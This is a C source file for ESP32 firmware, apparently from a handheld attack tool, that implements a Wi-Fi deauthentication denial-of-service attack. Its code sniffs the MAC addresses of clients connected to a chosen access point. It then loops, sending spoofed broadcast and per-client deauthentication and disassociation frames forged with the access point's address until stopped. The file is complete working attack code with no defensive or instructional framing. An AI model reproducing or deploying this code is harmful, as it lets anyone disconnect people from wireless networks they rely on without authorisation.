#include "hackk/attack_dos.h"
#include "hackk/ui_status.h"
#include "hackk/hydra_config.h"
#include "hackk/wifi_controller.h"
#include <string.h>
#include <stdlib.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_log.h"
#include "esp_timer.h"

static const char *TAG = "attack_dos";
static void deauth_task(void *arg);

// ── Internal state ─────────────────────────────────────────────
static volatile bool     s_running       = false;
static volatile uint32_t s_frames_sent   = 0;
static TaskHandle_t      s_task_handle   = NULL;
static SemaphoreHandle_t s_state_mutex   = NULL;

// Target parameters (filled by attack_dos_start)
static uint8_t  s_target_bssid[6]   = {0};
static uint8_t  s_target_channel     = 1;
static char     s_target_ssid[33]    = {0};

bool attack_dos_start_by_bssid(const uint8_t *bssid, uint8_t channel)
{
    if (s_running) return false;
    memcpy(s_target_bssid, bssid, 6);
    s_target_channel = channel;
    strncpy(s_target_ssid, "(direct)", sizeof(s_target_ssid) - 1);
    s_frames_sent = 0;
    s_running     = true;

    esp_wifi_set_channel(s_target_channel, WIFI_SECOND_CHAN_NONE);
    xTaskCreate(deauth_task, "deauth_task", 8192, NULL, 5, &s_task_handle);

    ui_event_t ev = { .type = EVT_DEAUTH_STARTED };
    snprintf(ev.line, sizeof(ev.line), "Deauth (direct)");
    ui_status_publish(&ev);
    return true;
}

// ── 802.11 Management Frame (deauth / disassoc) ────────────────
// 26 bytes: FC(2) DUR(2) DA(6) SA(6) BSSID(6) SEQ(2) REASON(2)
typedef struct __attribute__((packed)) {
    uint8_t  frame_control[2]; // FC byte 0, FC byte 1
    uint16_t duration;
    uint8_t  dest[6];          // destination MAC
    uint8_t  src[6];           // source MAC (spoofed AP BSSID)
    uint8_t  bssid[6];         // AP BSSID
    uint16_t seq_ctrl;
    uint16_t reason;
} mgmt_frame_t;

// ── Client MAC table (populated by sniff phase) ─────────────────
static uint8_t  s_clients[DEAUTH_MAX_CLIENTS][6];
static int      s_client_count = 0;

// Promiscuous callback — collects client MACs on target channel
static void promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_DATA) return;
    const wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *payload = ppkt->payload;

    // Data frame with ToDS bit set (bit 0 of FC byte 1) → client→AP direction
    // Layout: FC(2) DUR(2) BSSID(6) SA(6) DA(6) ...
    // Check BSSID (bytes 4-9) matches target
    if (!(payload[1] & 0x01)) return;  // ToDS must be set
    if (memcmp(&payload[4], s_target_bssid, 6) != 0) return;

    // Source address is at bytes 10-15
    const uint8_t *sa = &payload[10];
    // Skip broadcast / multicast
    if (sa[0] & 0x01) return;

    for (int i = 0; i < s_client_count; i++)
        if (memcmp(s_clients[i], sa, 6) == 0) return; // already known

    if (s_client_count < DEAUTH_MAX_CLIENTS) {
        memcpy(s_clients[s_client_count], sa, 6);
        ESP_LOGI(TAG, "Client found: %02X:%02X:%02X:%02X:%02X:%02X",
                 sa[0],sa[1],sa[2],sa[3],sa[4],sa[5]);
        s_client_count++;
    }
}

// Send one management frame (deauth or disassoc) to a specific dest
static inline void send_mgmt(uint8_t fc0, const uint8_t *dest,
                              const uint8_t *bssid, uint16_t reason)
{
    mgmt_frame_t f = {0};
    f.frame_control[0] = fc0;
    f.frame_control[1] = 0x00;
    f.duration         = 0x0000;
    memcpy(f.dest,  dest,  6);
    memcpy(f.src,   bssid, 6);
    memcpy(f.bssid, bssid, 6);
    f.seq_ctrl         = 0x0000;
    f.reason           = reason;
    esp_wifi_80211_tx(WIFI_IF_STA, &f, sizeof(f), false);
}

// ── Send one burst: broadcast + unicast deauth+disassoc per client
static void send_deauth_burst(const uint8_t *bssid, uint8_t channel)
{
    static const uint8_t BROADCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    (void)channel;

    for (int i = 0; i < DEAUTH_BURST_COUNT; i++) {
        if (!s_running) break;

        // 1. Broadcast deauth (AP→all) — catches any undiscovered clients
        send_mgmt(0xC0, BROADCAST, bssid, 0x0007);
        // 2. Broadcast disassociation (AP→all)
        send_mgmt(0xA0, BROADCAST, bssid, 0x0007);

        // 3+4. Unicast deauth+disassoc to every known client
        for (int c = 0; c < s_client_count; c++) {
            if (!s_running) goto done;
            send_mgmt(0xC0, s_clients[c], bssid, 0x0007); // AP→client deauth
            send_mgmt(0xA0, s_clients[c], bssid, 0x0007); // AP→client disassoc
        }

        s_frames_sent += 2 + (uint32_t)(s_client_count * 2);

        if ((s_frames_sent % DEAUTH_EVENT_INTERVAL) == 0) {
            ui_event_t ev = {
                .type    = EVT_DEAUTH_FRAME,
                .counter = s_frames_sent
            };
            snprintf(ev.line, sizeof(ev.line), "Frames: %lu cli:%d",
                     (unsigned long)s_frames_sent, s_client_count);
            ui_status_publish(&ev);
        }

        vTaskDelay(pdMS_TO_TICKS(DEAUTH_FRAME_DELAY_MS));
    }
done:;
    vTaskDelay(pdMS_TO_TICKS(DEAUTH_CHANNEL_HOLD_MS));
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

// ── Attack task ─────────────────────────────────────────────────
static void deauth_task(void *arg)
{
    ESP_LOGI(TAG, "Deauth task started — target %02X:%02X:%02X:%02X:%02X:%02X ch %u",
             s_target_bssid[0], s_target_bssid[1], s_target_bssid[2],
             s_target_bssid[3], s_target_bssid[4], s_target_bssid[5],
             s_target_channel);

    // ── Phase 1: Sniff client MACs ──────────────────────────────
    s_client_count = 0;
    esp_wifi_set_channel(s_target_channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous_rx_cb(promisc_cb);
    esp_wifi_set_promiscuous(true);

    ui_event_t sniff_ev = {.type = EVT_DEAUTH_FRAME, .counter = 0};
    snprintf(sniff_ev.line, sizeof(sniff_ev.line), "Sniffing...");
    ui_status_publish(&sniff_ev);

    uint32_t sniff_start = (uint32_t)(esp_timer_get_time() / 1000);
    while ((uint32_t)(esp_timer_get_time() / 1000) - sniff_start < DEAUTH_SNIFF_MS
           && s_running) {
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    esp_wifi_set_promiscuous(false);
    ESP_LOGI(TAG, "Sniff done — %d client(s) found", s_client_count);

    snprintf(sniff_ev.line, sizeof(sniff_ev.line), "Clients: %d", s_client_count);
    ui_status_publish(&sniff_ev);

    // ── Phase 2: Attack loop ────────────────────────────────────
    while (s_running) {
        send_deauth_burst(s_target_bssid, s_target_channel);
        vTaskDelay(pdMS_TO_TICKS(DEAUTH_BURST_PAUSE_MS));
    }

    ESP_LOGI(TAG, "Deauth task exiting — %lu total frames", (unsigned long)s_frames_sent);
    s_task_handle = NULL;
    vTaskDelete(NULL);
}

// ── Public API ─────────────────────────────────────────────────
bool attack_dos_start(int ap_index)
{
    if (s_running) return false;

    // The caller (ui_deauth.cpp) has already scanned and stored AP records.
    // We fetch the record by index. In your port, replace this with a call
    // to your wifi_controller's get_scanned_ap(ap_index, &record) function.
    wifi_ap_record_t record = {0};
    if (!wifi_controller_get_ap(ap_index, &record)) {
        ESP_LOGE(TAG, "AP index %d not found", ap_index);
        return false;
    }

    memcpy(s_target_bssid, record.bssid, 6);
    s_target_channel = record.primary;
    strncpy(s_target_ssid, (char *)record.ssid, sizeof(s_target_ssid) - 1);

    s_frames_sent = 0;
    s_running     = true;

    esp_wifi_set_channel(s_target_channel, WIFI_SECOND_CHAN_NONE);

    xTaskCreate(deauth_task, "deauth_task", 8192, NULL, 5, &s_task_handle);

    ui_event_t ev = { .type = EVT_DEAUTH_STARTED };
    snprintf(ev.line, sizeof(ev.line), "Deauth on %s", s_target_ssid);
    ui_status_publish(&ev);

    return true;
}

void attack_dos_stop(void)
{
    if (!s_running) return;
    s_running = false;

    if (s_task_handle) {
        // Wait up to 2 s for the task to exit cleanly
        for (int i = 0; i < 20 && s_task_handle; i++) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }
    }

    ui_event_t ev = { .type = EVT_DEAUTH_STOPPED,
                      .counter = s_frames_sent };
    snprintf(ev.line, sizeof(ev.line), "Sent %u", s_frames_sent);
    ui_status_publish(&ev);

    ESP_LOGI(TAG, "Deauth stopped after %u frames", s_frames_sent);
}

bool attack_dos_is_running(void)   { return s_running; }
uint32_t attack_dos_frames_sent(void) { return s_frames_sent; }
